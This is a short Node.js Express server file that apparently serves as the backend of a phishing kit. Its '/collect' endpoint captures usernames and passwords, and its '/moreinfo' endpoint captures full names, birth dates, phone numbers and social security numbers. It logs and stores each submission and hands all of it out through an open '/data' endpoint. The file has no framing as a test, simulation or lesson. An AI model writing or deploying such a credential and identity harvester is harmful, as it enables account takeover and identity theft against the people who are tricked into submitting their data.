const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

let fakeDatabase = [];

// Login credential collection
app.post('/collect', (req, res) => {
    const { username, password } = req.body;
    console.log(`Login: ${username} / ${password}`);
    fakeDatabase.push({ type: 'login', username, password, timestamp: new Date() });
    res.json({ success: true });
});

// Personal info collection
app.post('/moreinfo', (req, res) => {
    const { fullname, dob, phone, ssn } = req.body;
    console.log(`Personal Info: ${fullname}, ${dob}, ${phone}, ${ssn}`);
    fakeDatabase.push({ type: 'personal-info', fullname, dob, phone, ssn, timestamp: new Date() });
    res.json({ success: true });
});

app.get('/data', (req, res) => {
    res.json(fakeDatabase);
});

app.listen(PORT, () => {
    console.log(`✅ Backend running at http://localhost:${PORT}`);
});
